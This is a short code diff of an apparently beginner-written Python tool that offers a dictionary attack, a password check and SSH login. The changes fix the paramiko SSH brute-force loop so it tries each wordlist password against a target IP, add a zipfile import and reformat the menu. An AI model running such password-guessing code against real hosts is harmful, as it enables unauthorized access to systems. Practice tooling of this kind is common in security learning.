@@ -17,6 +17,7 @@ import time
 import paramiko
 import cryptology
 from getpass import getpass
+import zipfile
 
 # Varibles:
 #File_Path = input("Input file path for Dictionary attack: ")
@@ -105,7 +106,7 @@ def ssh_login():
     for password in file:
         try:
             # uses the ssh variable to try the given IP, username, and password to login
-            ssh.connect(ip, 22, username, password_list, timeout=3)  
+            ssh.connect(ip, 22, username, password, timeout=3)  
             # the f means it will print the variables so its not hard coded
             print(f"Login successful! Username: {username}, Password: {password}")
             # not sure what this specific line does
@@ -128,7 +129,7 @@ def ssh_login():
 
 
 # Main
-menu = input("Press 1 to use a dictionary attack  Press 2 to check your password,  Press 3 to SSH: ")
+menu = input("Press 1 to use a dictionary attack  \nPress 2 to check your password  \nPress 3 to SSH:  ")
 if menu == "1":
     Brute_Force()
 elif menu == "2": 
